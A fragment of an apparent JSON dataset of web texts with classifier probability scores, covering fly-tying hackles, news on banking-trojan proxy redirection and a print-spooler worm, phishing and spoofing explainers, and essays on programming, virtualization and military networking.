Hand Made Fiber Tools by Blue Mountain Handcrafts and Combing Cria Alpaca into Smooth Spinnable Fiber. - Free Fly Tying Instructions: Parachute Adams Pattern : How to Wrap the Hackle: Fly Tying Pattern for Parachute Adams Learn how to wrap the hackle of a Parachute Adams artificial fly - free fly tying video instructions. - Fly Tying Dave's Soft Hackle Hook: Size 20 to 14 Diiachi or equivalent Body: Black Thread or color to match the hatch Thorax: Rabbit Dubbing or pea*** Rib: Copper or color to contrast Hackle: Hungarian partridge or equivalent This fly may be fished across and downstream - Soft Hackle Ray Charles - July 2009 TPO Fly of the Month Aaron ties up a tailwater killer. Justin and Aaron destroyed them at the Big Horn and several other Montana tailwaters with this. Easy and quick to tie, this fly is a must have for your next trip to a bottom release. The 20 inch rainbows couldn't stay off this at another famous Montana river. - How to add hackle to a parachute fly How to add a hackle to a parachute fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at - Frisco kid Hackle you Frisco kid Hackle-you Belly - Chris Reeves' Soft Hackle Irish Mayfly - TPO Guest Fly # 2 Chris Reeves of the UK ties a staple of his box. He is an avid still water fisherman and fly tyer. Try out this soft hackle next time you are fishing in the film. - How to Wind Hackle How to wind hackle onto your dry fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at - Tying a Soft Hackle Fly Wayne Walts, of Troutfitter, a fly fishing specialty shop in Syracuse, demonstrates tying a soft hackle fly. He's using a size 14 hook and a hen feather. Visit for more news and multimedia. - Chewee Skin Green McKenzie Soft Hackle In this video Barrett Christiansen demonstrates how to tie a Chewee Skin Green McKenzie Caddis Soft Hackle. This pattern imitates the large McKenzie Caddis that emerges on the McKenzie River near Eugene late April-June. The UV Chewee skin is a new and easy to use material for bodies, wing cases and shell backs. The UV quality to the material allows for the colors to show better to fish at distance and low light conditions. Fish this fly under a dry, swung wet fly style or skated near on on the surface. - Tying the Royal Coachman SoftHackle by Davie McPhail - Tying Tips 2 - Selecting Feathers for Soft Hackle Flies Jeff Hines discusses the selection of feathers for tying soft hackle flies. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, AR. - Wool Combing, Fiber Combs, Hackle and Tools #1 Hand Made Fiber Tools by Blue Mountain Handcrafts. - Tying with Hans- Hans' Spring Soft Hackle This easy to tie soft hackle pattern takes early season trout feeding on midges or emerging baetis mayflies. The purple thorax seems to be a trigger to trout. This fly can be fished deep behind a nymph, on the swing, or as a dropper a few inches behind a dry fly. Happy Tying - Hare's Ear Soft Hackle fly tying instructions The Hare's Ear Soft Hackle is just an all around great fly. This buggy little wet fly fishes great as a March Brown emerger on the Lower McKenzie River in the early spring. Easy to tie and great to have in the fly box. For more fly tying videos, check out . - Fly Tying with Hans: Soft Hackle Soft hackles have been around for a long, long time. In the video I say a hundred years; well I looked it up, try 500 years! There must be a reason- ah yes, they catch fish. These are simple flies to tie and they work extremely well. Experiment with various color schemes and materials. - Fly tying feathers: Hackle folding instructions Fly tying guru Jay Nicholas demonstrates how to fold and hackle fly tying feathers in this new video. For more fly tying demos and instructions, check out - Tying The Soft Hackle Nymph Using Micro Straggle All materials are available at Fly Tying Specialties. Provided by Steve Korbay at Fly Tying Specialties twitter about hackle Blogs & Forum blogs and forums about hackle “Posted: Friday, April 17th, 2009 @ 7:41 pm in Crochet, Etsy, Family, Fiber Prep, Hackle, dyed, natural dying | 2 Comments \" Horner. Craft & Found. Craft Pattern Podcast. . Crochet Liberation Front blog. Etsy french Blog. InspireMeThursday” — Chez Plum \" Hackle, “PaFlyFish is your source for Pennsylvania fly fishing for trout and bass with stream reports, forum, maps, hatch charts and blog” — Pennsylvania Fly Fishing - new hackle [Forum - Fly Tying], “photos of Dullstroom wedding photography at Critchley Hackle \" Wedding Photography by Dror Eyal : South Africa wedding photographer” — Dullstroom wedding photography at Critchley Hackle \" Wedding, droreyal.co.za “Whats the best hackle?” — Whats the best hackle?, “We stayed at Critchley Hackle, in Dullstroom, on 22nd February, as an overnight stop on our way from Johannesburg to the Kruger Park. First comment it” — Our Visit to Critchley Hackle | African Safari and Travel News, “CARI Malay Forums Salam, nak tanya kenkawan kat sini, apa beza hackle warna warni yg dipakai ROTU tu?maksud saya, kalo warna oren dari mana?warna2 lain pulak dari man” — HACKLE - Agensi Keselamatan, Polis & Tentera - CARI Malay Forums, .my “Home \" Dennis Potter's Blog \" Ramblings of a Hackle Junkie The deeper you fish a soft hackle, the fewer fish you catch, but the size goes up. I” — Ramblings of a Hackle Junkie by Dennis Potter, “Majacraft now makes single and double row hackles” — Hackle-berry Finn | The Majacraft Blog, majacraft.co.nz “Fly Days of August: Orange PT Soft Hackle. August 19th, 2009 · No Comments. This has become Soft Hackle Materials. October 25th, 2008 · 7 Comments. Lets start with the hackles, where” — Soft Hackle,",
        "prob": "tensor([[0.2860, 0.7140]])"
    },
    {
        "text": "Proxy auto config (PAC) is a feature accepted by all modern browsers, according to Fabio Assolini, a lab expert at Kaspersky. It contains a function to redirect browsers to a specific proxy server. A proxy server is a computer that accesses the Internet on a computer user's behalf, and feeds it the results. Proxy servers are often used by systems administrators as a gateway between an organization's computers and the Internet, and PAC files are set on client machines so that they always access the Internet through a protected gateway. \"Unfortunately this simple and smart proxy technique is being largely used by Brazilian malware writers to redirect infected users to malicious hosts serving phishing pages of financial institutions,\" Assolini said. \"After being infected by a Trojan banker, if a user tries to access some of the websites listed in the script, they will be redirected to a phishing domain hosted at the malicious proxy server.\" Even browsers designed securely from the bottom up, such as Google's Chrome, are susceptible to this attack, which changes the file prefs.js to insert a malicious proxy before adding a malicious dynamic link library to always rewrite the proxy, if it is removed. This attack is an interesting variation on a more conventional redirection attack involving the Windows Hosts file. This is a plain text file containing a list of Domain Name System lookups, which a Windows computer will refer to first, before trying to resolve a domain name using an external server. Malware that alters DNS entries in a Hosts file instructs a Windows computer to visit any malicious IP address that the attacker wants when the user types in a legitimate web address, such as one for an online bank, for example.",
        "prob": "tensor([[2.0563e-06, 1.0000e+00]])"
    },
    {
        "text": "The path is sometimes a big security problem. It is a very common way to hack into a system using some mistakes in path settings. It is easy to make Trojan horse attacks if hacker gets root or other users to execute his versions of commands. A common mistake in the past (?) was to keep '.' in the root's path. Malicious hacker makes program 'ls' in his home directory. If root makes # cd ~hacker # ls he executes ls command of hacker's. Indirectly, this same applies to all the programs that are executed as root. Any of the important daemon processes should never execute anything that some other user can write into. In some systems, /usr/local/bin is allowed to contain programs with less strict security screening - it is just removed from the path of the root user. However, if it is known that some daemon executes 'foo' using path '/usr/local/bin/:...', it may be possible to cheat daemon to execute '/usr/local/bin/foo' instead of '/bin/foo'. Likely anybody who can write to '/usr/local/bin' is able to break into the system. It is very important to consider in what order the directories are in the path. If /usr/local/bin is before /bin, it is a security risk - if it is after, it is not possible to overwrite command /bin/foo with some localized modification in /usr/local/bin/foo. In Linux it should be remembered that the path evaluation is done in the operating system call level. Everywhere where an executable file path is given you can give a short name that is searched at least from /bin and /usr/bin - likely from many other places as well.",
        "prob": "tensor([[0.0303, 0.9697]])"
    },
    {
        "text": "Virtualizing the Embedded World: Vista Over Linux in a Cell Phone? Motivation for Running a Hypervisor on Embedded Systems While you probably won't run Vista as a virtual machine on your cell phone, there are many viable use cases of virtualization for embedded applications. The most simplest, cheapest, feature rich is using Linux and KVM. Servers and desktops are not alone, virtualization is also a perfect fit for embedded devices too. Virtualization benefits are well understood for the traditional server consolidation purposes. Hypervisors, aka virtual machine monitors (VMM) are common in almost every data center, saving equipment, power and management costs. Embedded applications, ranging from terabit routers, hardware appliances, media-rich set-top boxes to cellular phones and media players can all benefit from virtualization. At a glance it may looks like an over kill to run virtual machines on embedded systems (see Figure 1). Embedded systems might be resource limited, having limited memory/CPU/latency/scheduling. They are also often tailor-made to match specific hardware/software combinations. Deeper insight reveals many advantages of virtualization for embedded: - Consolidation--Expensive custom-made hardware increase the motivation to consolidate several physical devices into a single one. Consolidation also helps to reduce complexity for distributed environments--All the virtual machines live on the same physical server, there are no risks of network partitioning, hardware failures are atomic and a common high availability (HA) solution deal with them while collapsing many scenarios. - Security--Breaking into the cellular phone management/java stack won't jeopardize the communication stack and the main cell if each of them is run in a different virtual machine (VM). The VM environment is a big sand box for untrusted code. - Reliability--Isolate privileged code and prevent/reduce entire device failures - Management and rapid development--Even if running RTOS for managing the hardware, there is no need to settle for its limited management capabilities. A management VM running Windows can run the user interface, making both users and developers life easier. - Hardware virtualization--VMM is an exact fit for hardware virtualization, dynamically divide and unit physical resources along with their virtual controller. Large, distributes embedded machines such as routers can be split and unite along with the router engine machine, executed as a VM. - Efficiency--In the multi-core era many physical cores are under-utilized, some not even initialized since the embedded software was uni-processor - New exciting features--Sophisticated features like snapshots, live migration, external hibernation can enhance embedded products that tend to demand high availability, upgradability (even remote kernel upgrades), etc - Law--Unlinkage of the GPL code from proprietary code can be easily obtained using virtualization - Skip Ahead - 1. Motivation for Running a Hypervisor on Embedded Systems - 2. Motivation for Running a Hypervisor on Embedded Systems - 3. Motivation for Running a Hypervisor on Embedded Systems - 4. Motivation for Running a Hypervisor on Embedded Systems Solid state disks (SSDs) made a splash in consumer technology, and now the technology has its eyes on the enterprise storage market. Download this eBook to see what SSDs can do for your infrastructure and review the pros and cons of this potentially game-changing storage technology.",
        "prob": "tensor([[0.0250, 0.9750]])"
    },
    {
        "text": "What is phishing? Phishing is an attempt to steal sensitive information, such as your social security number or passwords, by posing as a trusted company. It is most commonly attempted via an email that will claim to come from a trusted company, such as your bank or your credit card company. If you follow the links provided in the email, you will appear to be providing your information to the trusted company, while in fact you will be providing that information to a phisher. Phishers are known for using this information for identity theft and other fraudulent acts. How do I recognize phishing? Phishing attempts are getting more and more difficult to recognize. There are some general rules of thumb that can help you identify them. First, companies should not ask you any sensitive information via email. Legitimate companies that require sensitive information from you will typically send you a physical letter or require that you come in to their place of business to confirm your identity. If an email contains a link that you can click on, you should be suspicious. Second, if the information request appears to come from a company that you do use, such as your bank, and you are unsure if it is a phishing email or not, give them a phone call instead of following the link in the email. Third, almost any company that can contact you via email could also contact you via phone. Despite whatever consequences of not responding are listed in the email, consider not responding. Almost all large companies, especially financial institutions, will attempt to contact you through a means other than email before taking any action against your account.",
        "prob": "tensor([[2.0569e-06, 1.0000e+00]])"
    },
    {
        "text": "But what if someone you trust urged you via e-mail to download a seemingly important file – would you do that? It’s no secret that criminals often hide their true identity in order to trick people into falling for their scams. And it’s so easy to pose as someone else on the internet, especially since those who you’re talking to can’t really see you. Impersonating someone else in order to trick potential victims into taking certain actions that they wouldn’t normally take is one of the most common tactics used by cybercriminals to make their internet security scams successful. Not only can cybercrooks successfully pass as someone else, but they can also design programs and websites to look like other legitimate ones. In either case, we’re talking about spoofing – the art of online masquerading, as most internet security experts call it. Spoofing versus phishing A common misconception about spoofing is that it’s the same thing as phishing. In fact, they’re two different internet security threats, but strongly tied to one another. Phishing is basically tricking someone to give up sensitive information – usually social and bank account credentials and credit card details. Spoofing, on the other hand, refers to how cybercrooks actually trick their target – by posing as a well-known, trustworthy entity. So, more often than not, phishers rely on spoofing in order for their phishing scams to be successful. For example, you receive an e-mail from your bank telling you your account has been suspended for whatever reason, and in order to reactivate it, you have to hand over your credit card details. This, clearly, is a phishing attempt – your bank would never send you such e-mails! And the fact that the e-mail seems to come from your bank, when in fact it doesn’t – that’s spoofing. The most common forms of spoofing Spoofing is one of the oldest tricks in the book – cybercriminals’ book, that is – but also one of the most effective in breaching web users’ internet security. Over the years it has taken on various forms, depending on technological advancements and trends in web users’ activity. Here are the most common forms of spoofing you’re most likely to come across in the WWW: - E-mail spoofing. The example provided above is actually a form of e-mail spoofing. The sender address and the signature are made up to appear as though the e-mail was sent by a certain person or company. To make their e-mails look authentic and credible, cybercrooks have spoofed e-mail sender sections by listing names of renowned banks and websites like eBay, Amazon and PayPal, and continue to do so. - URL spoofing. In some internet security scams, cybercrooks reproduce legitimate webpages and send the legit-looking web address (URL) in fake e-mails to web users or place it on other sites. When a user clicks on it, they’re redirected to the malicious site. Cybercrooks can also create malware that exploits web browser vulnerabilities; if a user unknowingly downloads it onto their PC, the malicious bit can manipulate their browser to show, for example, a fake bank account login page, whenever they browse for the real thing. In this particular case, the user is faced with a man-in-the-browser attack. - Spoofing files on file-sharing platforms. Not all files you find on popular file-sharing platforms are legitimate. Some of them may look like the real thing, with the same name/title/author, but in fact they may be fake and contain some kind of malware. - IP spoofing. Hackers can gain unauthorized access to computer networks by making the IP address of their computer look like the one of a trusted machine. This way they can perform network attacks and make them look as being performed by another entity. - Wi-fi spoofing. Some Wi-fi hotspots can look like they’re owned by reputable companies, but in fact, they’re set up by cybercrooks who want to steal data received or sent by users. Protect yourself from spoofers! Here’s a bunch of solid internet security tips to protect yourself and your device from the threats listed above: - Be suspicious of every e-mail that asks you to hand over personal information, no matter if the sender is a close relative or a trustworthy institution. Remember: your bank would never ask you for your credit card details via e-mail; Facebook would never ask for your account credentials this way either. If you receive an e-mail from them linking to their site, don’t click on the link provided. Instead, open the respective site from a new window, just to avoid accessing a fake one. - Beware of phishing attacks. Keep yourself informed about new phishing methods and for extra protection, install an internet security suite that comes with Antiphishing and Safe Browsing to warn you against malicious websites. BullGuard’s internet security suite comes with such features. - Don’t be too trusting when it comes to the security of file-sharing platforms. It’s best you have your own security in place, i.e. effective antivirus protection like the one offered by BullGuard Internet Security 12. Its antivirus engine protects your computer even from the newest forms of malware. - Make sure you have a solid Firewall installed on your PC, to counter any network attacks from hackers. - Be careful with public Wi-fi hotspots. It’s best you don’t bank or shop online while connected to a hotspot, as you never know what prying eyes might be “watching” your transaction and steal your financial details.",
        "prob": "tensor([[2.0692e-06, 1.0000e+00]])"
    },
    {
        "text": "Energy Efficient Programming In my most recent job I was looking at energy efficient computing, which is a big deal in mobile computing. Everyone wants their tablet or phone or notebook to run as long as possible on a single charge of the battery. Efficient use of energy is also becoming a really big deal in cloud computing with all those processors sitting in a data center (supporting mobile computing users) and technical computing centers where larger and larger clusters are assembled on the road to Exascale computations. One notable alternative energy source is the supercomputer in the Advania Thor Data Center in Iceland, which uses hydro- and geothermal energy that is relatively cheap. (I wonder if they simply open a window to cool down the data center machines.) - IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies - Application Testing Strategies in the IBM z/OS Environment - Strategy: How to Conduct an Effective IT Security Risk Assessment - Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5 - The Untapped Potential of Mobile Apps for Commercial Customers - Why is Information Governance So Important for Modern Analytics? As with processor speeds in the run up to multicore processors for the masses, the energy envelope of hardware is being improved (i.e., lowered) with each new generation. Recently I was made privy to the plans of a large international chip producer and found the numbers impressive as to how low it is going to be taking the power usage in its flagship processors over the next few years. From all this data and the focus on improving energy utilization in hardware, it looks like software developers are still in the \"free lunch\" phase with regards to energy consumption. That is, I can simply wait until the next processor generation is released, recompile my application, and get the benefit of equal or better execution performance while the power consumption of my application improves automatically. In those halcyon days when I could spend a year at the beach instead of coding and still speed up my code execution by running my application on the faster, next-generation processor, it was still possible to make improvements to the application that would optimize execution and increase the execution speed on the currently available hardware. Now, for those of us that might be more proactive about energy efficiency (or don't have a beach close enough), I wonder if there is anything a programmer might be able to do that would directly affect the power consumption of a given piece of code. In more colloquial terms, I could pose the question: \"Which is more energy efficient: a for loop or a I'm sure that I'm showing my ignorance of hardware and computer architecture when I say, \"Yes, a programmer can affect the energy consumption of an application, but not as directly as we might hope.\" Allow me to qualify that before you jump all over my naiveté. In the arena of serial programming (more on the effects of parallel execution in a few paragraphs), there might not be much programmer influence on energy usage. I am assuming the execution of one instruction requires the same amount of energy as any other instruction. From what I remember about modern computer architecture and the execution of instructions, there is a pipeline to perform all the steps required and there are fixed number of stages in the pipeline. This suggests that it doesn't matter if the instruction is a floating-point or integer operation; the energy needed to traverse the pipeline is the same. I do recall that there are more overall steps involved in handling floating-point numbers versus integers, but that just might mean some stages in the pipeline are skipped. Is there any appreciable energy savings to be had when bypassing the exponent normalization? Even if my assumption on energy consumption between two different operations is wrong, there aren't many applications that I know of where you can replace floating-point calculations with an integer operation and still yield correct results. Looking in a positive direction, one thing that I am sure can be done by the programmer would be to reduce the total number of instructions. If you can accomplish in 100 instructions what can also be done in 200 instructions, the former execution will use less overall energy. There are certainly large changes in the number of instructions used by one algorithm over another; e.g., Quicksort over Bubblesort. Unrolling loops will perform the same number of computational steps, but reduces the number of testing and looping instructions that are executed. There might be some difference in the energy consumption between a for loop and a while loop if the number of instructions involved in incrementing loop index variables and testing termination conditions are significant between the two variations. If there is such a difference and such a change is feasible, is that energy savings worthwhile for all the time and effort it would take to recode from one loop format to the other? Vector operations are another place where a programmer can reduce the consumption of energy by an application. Does it cost any more energy to execute on a single operand (in a vector register) than it would require if you load up the vector register with four operands? I would think both situations are the same, but the latter gets four times the results and is able to compute the desired answers in one-fourth of the time with only one quarter the energy consumed. Compilers can detect many instances where vector computations could be used even if the programmer didn't explicitly code for vector operations. If the compiler can't make that call due to conservative assumptions, intervention by the programmer via compiler directives or pragmas will inform the compiler that such vectorizations are safe. Adding these compiler hints will be much less time-consuming than changing loop structures. In cases where vectorization might not be viable, but there are still independent computations that can be executed concurrently, there is still a possibility for energy conservation on multicore processors. Today's processors, as I mentioned earlier, are more energy aware. When the processor is not actively executing, it will be set into a lower powered state as it sits idle. When some execution is ready to proceed, the frequency and power are amped up and the computation is executed. For sake of example, let me assume I have a quad-core processor that runs at 5Wh (Watts per hour) per core when the core is running at full speed and 1Wh per core when idle. Running a serial computation that takes 4 hours will burn 32 Watts (20, 1 core x 5Wh x 4 hours, for the active core and 12, 3 cores x 1Wh x 4 hours, for the three idle cores). If I can parallelize that same computation across all four cores, the execution time will be only one hour and the total energy used will be only 20 Watts (4 cores x 5Wh x 1 hour). Not only is the answer computed quicker, but the parallel execution has a tangible energy savings. I was once told that a prominent GPU producer had measured the amount of energy that every operation (computation, access to memory, moving data in from off-card, etc.) took on its products. If an addition or multiplication or a register shift take different amounts of energy, how willing would you be to find just the right mix of equivalent instructions to carry out some desired computation? Then, how much documentation do you need to provide to the programmer that needs to maintain your code so that the version you implemented — instead of the standard algorithm — is much better for everyone? There are easier ways to conserve power (outlined above) and do your little part to save the polar ice caps and the planet, which will help keep the oceanfront beaches where they are instead of outside your third-story window.",
        "prob": "tensor([[3.7959e-04, 9.9962e-01]])"
    },
    {
        "text": "A common recommendation in our profession is to learn a new language each year. This advice can truly be sold only to people starting out in software development, rather than practiced hands. Unless you're a language junkie, this is advice that cannot be followed because languages take more than a year to learn well (that is, far beyond simple exposure and noodling with small projects). - IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies - Application Testing Strategies in the IBM z/OS Environment - Strategy: How to Conduct an Effective IT Security Risk Assessment - Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5 - The Untapped Potential of Mobile Apps for Commercial Customers - Why is Information Governance So Important for Modern Analytics? A language doesn't really begin to expose its strengths and weaknesses until you write programs of several thousand lines. That's the point where you recognize that a feature that looked appealing is now an encumbrance and another feature that seemed pointless is truly valuable. This insight is equally true of the principal tools in the language's ecosystem, most especially the debugger and the build tools. The former is particularly important, because errors are expressed in radically disjoint ways in different languages. There is another stage beyond this level, which is writing idiomatically in the language, rather than taking our native coding style into the new world. This last step is particularly difficult. I'm speaking here conceptually, rather than syntactically. Each language uniquely expresses fundamental concepts that it favors. For example, Go, which we've discussed extensively during the last 12 months, does not use object orientation in the usual way, rather it favors composability. Composability requires a whole different approach to building programs from objects. It forces newbies to rethink how OO works and how to represent programs as objects. If you stop short of learning composability in Go, and simply learn the syntactic equivalents of operations you already know, then you've lost most of the benefit of the \"learn a new language\" dictum. This is where the real value accrues. Build some multi-KLOC programs using composability and there is no doubt you will write different code when you return to C++ or Java. This underscores a key point: To maximize the value of learning a new language, it's important to choose one that is significantly different from the ones you know: for example, learning a functional language if your natural home is OO; learning OO if your natural home is imperative; and so on. After choosing a language that sparks your interest, it's important to avoid the path of least resistance, which goes something like this: Buying a tutorial. Going through the first 150 pages and learning the syntax plus a few handy concepts. Putting the book down and starting to work on a small sample project. And then looking up items on an ad hoc basis when you need them later. The slip is in not finishing the tutorial. As a result, you pick up only the simple things that you need immediately and lose all the advanced topics. Have you really learned Java if you've not explored reflection, serialization, or, say, class loaders? I submit you probably haven't. And unfortunately for many of us (me included), we learn the subset that is predominantly needed by daily work. Why learn reflection if I don't need reflection in my work? The answer is clear: If you don't know reflection, you will never spot the opportunities where it will best solve a problem. (I don't want to stray too far off topic, but this is the benefit of reading other people's code. Good developers use the entire palette of features of a language, so reading their code illuminates instances where an elegant solution is possible via a little advanced feature you might not have known about.) The bottom line is that learning a new language is both a long effort and a deeply rewarding one. I don't believe that a language can be mastered at the rate of one a year, so I view the recommendation to do this as pie-in-the-sky silliness, rather than a worthy goal. A much better path, in my view, is to learn several rather different languages well. And then cultivate and maintain the central ones you need by making sure you stay up with advances in the language and reading the code of other, better developers.",
        "prob": "tensor([[2.6904e-05, 9.9997e-01]])"
    },
    {
        "text": "Embedded devices a cinch to pwn The weak link in the chain CanSecWest Cell phones, modems, routers and similar devices are a lot easier to hack than most people think, making them an opportune target for criminals looking for an easy way to pierce a network, a researcher from Juniper networks says. Speaking at the CanSecWest security conference in Vancouver, Barnaby Jack demonstrated how a soldering kit and some basic knowledge about the processors typically used in embedded devices can allow miscreants to download the firmware running on the hardware. The code can then be modified to make the devices do all kinds of nefarious things, he warns. Over the past decade, computers - usually those running Windows - have emerged as the vector of choice for cyber crooks. That is beginning to change for several reasons. For one, years of trial and error (with an emphasis on error) has helped Microsoft harden the defenses of its software, making it harder to find critical vulnerabilities. At the same time, the number of cell phones, routers and other embedded devices has proliferated. Hardware designers often make it easy for their devices to be hacked because they contain debugging functionality and hardware interfaces not needed by end users. Jack demonstrated how modified firmware for a router made by D-Link changed default settings so remote administration was enabled. (He emphasized gear made by other vendors was equally at risk.) That in turn would allow the router to be accessed remotely, potentially allowing the altering of DNS settings or the disclosure of VPN credentials. We would have been more impressed had it been possible to modify the firmware remotely. Alas, that was not the case. To alter the settings, the criminal would need to access the device on the local area network. Jack claims similar attacks could be carried out over the net. We'll give Jack the benefit of the doubt here, not just because we're in a charitable mood, but also because he makes a good point. Embedded devices are everywhere and we suspect little thought or money is put into fortifying them against the increasing sophistication of today's cyber attacks. Consider yourselves warned. ®",
        "prob": "tensor([[2.1120e-06, 1.0000e+00]])"
    },
    {
        "text": "DARPA looking for citizen sky-watchers Why not find some space junk in your spare time? A reader has alerted The Register to a story that passed us by last week: the launch of a DARPA program recruiting amateur astronomers to help identify and catalogue space junk. Launched here, the SpaceView project would add “citizen scientist” efforts to more expensive space junk searches like the Space Surveillance Network. The number of known objects in the cloud of detritus surrounding the Earth is more than half a million and growing – every new launch adds to the problem, and collisions between objects are getting more common as they multiply. By comparison, the Space Surveillance Network is only tracking around 30,000 bits of junk. Hence SpaceView: an attempt to expand the available resources without crippling cost. The project is currently at the sign-on stage: DARPA wants to know about the “equipment, sites and observing habits” of astronomers interested in joining the program. The program is looking for sites with equipment that could be upgraded to collect observations under remote control, which would act as a single distributed world-wide sensor. Where a site is selected for inclusion in SpaceView, DARPA will provide the equipment to turn it into an automated observatory. The first dozen sites will be selected late in 2013. ®",
        "prob": "tensor([[0.0378, 0.9622]])"
    },
    {
        "text": "Physically Secure Your Computer Unfortunately, computer thefts do occasionally happen at Whitman. Almost always it is a crime of opportunity — a laptop left alone and unsecured in the library, for example. It is your responsibility to ensure that your computer is secured against physical theft. The following advice can help you to that end. Protect the Computer Itself The best way to protect yourself from computer theft is to make it as difficult as possible for someone to pick up your machine and run off with it. - If you have a desktop computer, you may wish to investigate padlocking the case shut to prevent theft of internal components. - If you have a laptop computer, you may wish to acquire a laptop locking cable: the computer equivalent of a bicycle lock. - At the very least, do not leave your laptop unprotected or unattended, in any open area, even for a few minutes, and always make sure you close and lock your room door when you leave. Protect Access to Your Computer's Data If the worst should happen, and your computer does get stolen, the thief could gain access to all of your computer's secrets. It may not seem a big deal for a Bad Guy to see your homework assignments or music collection, but your computer could also contain some very valuable and important information about you. Passwords, financial data... even something as mundane as your Facebook credentials can have value to an attacker, and can easily be recovered from a stolen computer unless you take steps to protect your data. - Set a hard drive password. - If you laptop has a fingerprint scanner, consider using it to lock access to your computer's operating system. - Encrypt your home folder. OS X and (some versions of) Windows have built-in tools for doing this. More information may be found on our Encryption page. - Even better, encrypt your entire hard drive. For information on how to do this, see our Encryption page.",
        "prob": "tensor([[0.0055, 0.9945]])"
    },
    {
        "text": "A computer worm that propagates by exploiting a 2010 Windows vulnerability is responsible for some of the recent incidents involving network printers suddenly printing useless data, according to security researchers from Symantec. Many companies have reported unauthorised printing incidents in recent weeks, prompting antivirus firms to investigate the possible causes. On June 21, Symantec reported that the rogue printouts were the result of computers being infected with a Trojan program called Trojan.Milicenso. However, the company's researchers have since determined that the propagation routine of a separate piece of malware, a worm called W32.Printlove, can cause similar problems, Symantec researcher Jeet Morparia said earlier this week. W32.Printlove infects other computers on the local network by exploiting a remote code execution vulnerability in the Microsoft Windows Print Spooler service that was patched in September 2010. Identified as CVE-2010-2729, this vulnerability was also exploited by the Stuxnet industrial sabotage worm to spread. The rogue printing behaviour can occur when W32.Printlove unsuccessfully attempts to infect a Windows XP computer connected to a shared network printer. The worm starts by sending a print request to a targeted computer that is specifically crafted to exploit the CVE-2010-2729 vulnerability. If the exploitation attempt is successful, a copy of the malware is dropped in the Windows system directory and then executed. However, if the system is patched against CVE-2010-2729, a copy of the worm is created in the computer's printer spool directory - %SystemRoot%\\system32\\spool\\printers - as a randomly named .spl (Windows Printer Spool) file. The computer interprets the creation of this file as a new print job and instructs the network printer to print the file's contents, therefore wasting paper and toner. Because the worm periodically retries to infect a system, the rogue printing behaviour will be repeated until all network computers are cleaned, Morparia said. \"Tracking down the source of these junk print jobs can be more complicated when there are multiple infections on the network.\" Fortunately, the failed infection attempts leave behind .shd files in the printer spool directory that contain details about printing jobs, including the names of computers that initiated them. Administrators can inspect SHD files with a free tool called SPLViewer after shutting down the Print Spooler service, Morparia said. The W32.Printlove worm might be linked to the previously reported Trojan.Milicenso, Morparia said. \"We intend to continue our investigation to confirm any relationship between the two threats.\"",
        "prob": "tensor([[2.1194e-06, 1.0000e+00]])"
    },
    {
        "text": "Over the past decade, the United States has witnessed remarkable advances in personal communications technology. Most of us now take for granted the ability to share all forms of information quickly, efficiently and cheaply. Our men and women in uniform have that same expectation. However, the modern warfare environment is complex and much different from what it was even 10 years ago. Additionally, preparing for current and future wartime environments is especially challenging in our fiscal climate. Fiscal responsibility will mean extending the useful lives of proven systems, leveraging investments in commercial technologies, making current systems more effective through affordable upgrades and exploiting new operational concepts made possible by small technical enhancements. In the case of the U.S. Army, it places more emphasis and responsibility on the squad. These squads need a substantial amount of flexibility and autonomy while staying connected to each other during the fight. U.S. forces need to collaborate and coordinate with unprecedented speed and accuracy. These well-trained fighting forces will need to make decisions on their own, and must have necessary information readily available. Networking is the uniquely powerful advantage for operations today and into the future. For example, networking sensor systems — including radars among ships, aircraft and tethered aerostats — creates a more complete picture of the theater. Information from netted radars can be combined to see enemy missiles and aircraft earlier, and to detect threats that might be able to evade individual radars. When our aircraft battle adversaries are equipped with capable air defenses, networked jamming can be used to more effectively blind the enemy’s own radars. A commander in the field can rely on netted sensors to receive alerts detailing enemy fires and maneuvers. Even on the move, a commander can use mobile mission command systems to request intelligence, plan a counterstrike, direct networked weapon systems to execute it and call on surveillance systems to deliver the information needed to assess the results. The technology empowers a single person or small unit to direct an action involving calls for intelligence, fires and surveillance. Shared, secure networks enable a convergence of intelligence and operations. Here’s another example of convergence: Vehicle-mounted night vision systems were developed originally to allow a gunner to see and engage targets at night and in degraded weather conditions. That mission expanded to the driver and commander. Once on the net, those cameras on the Army’s combat vehicles become sensor nodes. They become surveillance assets for the larger force, able to capture and deliver ground-level imagery to another unit that needs a different look at an area. With networks that scale from the tactical edge to headquarters, that same video footage can be shared and become part of the theater intelligence database, where it can help analysts fill gaps in regional imagery. A similar story could be told about images or audio captured by an infantry soldier. The dismounted soldier should be a major focus of investment in new networking technologies. Rich intrasquad communications enhance the autonomy and effectiveness of small units by going way beyond voice communication. “Here’s what I think” becomes “here’s what I am seeing.” A mission plan or tactical situation can be marked up white-board style by forces collaborating in silence. This results in a leap ahead in situational awareness at all echelons. Soldiers’ communication tools need to have effective filters to identify which information matters. During a firefight, a data glut is just as bad as a data dearth. There isn’t time to sift through all the information. Data that matters needs to be quickly and automatically flagged, integrated and shared. Small, high-definition cameras can now be easily and unobtrusively attached to weapons and armor. So intrasquad communication tools need to be able to carry full motion video. And data needs to be available immediately and without decay in its quality; even a few seconds of lag can mean the difference between a successful mission and one in which the enemy escapes or American lives are lost. During the push to upgrade military networking technologies, it’s still important to maintain fiscal responsibility. So the military and industry should collaborate and take advantage of existing systems that can be affordably upgraded, and make targeted investments in new tools that are compatible with these systems. Improving networking capabilities doesn’t require the military to break the bank, and equipping our forces with the networking tools they need will save lives and help them defeat our enemies. Andrew Zogg, vice president, Network Centric Systems, Business Development, Raytheon.",
        "prob": "tensor([[3.7426e-06, 1.0000e+00]])"
    },
    {
